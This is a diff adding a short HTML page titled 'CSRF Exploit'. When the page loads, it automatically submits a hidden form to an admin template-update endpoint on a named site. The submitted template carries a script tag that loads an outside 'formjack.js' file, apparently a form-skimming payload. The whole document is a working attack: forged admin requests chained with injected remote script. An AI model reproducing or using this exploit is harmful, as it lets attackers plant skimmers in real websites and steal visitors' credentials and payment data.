@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <form action="https://blinkee.com/admin/update-template" method="POST" id="csrfForm">
+        <input type="hidden" name="template" value="<script src='https://hamzycode.github.io/formjack.js'></script>">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
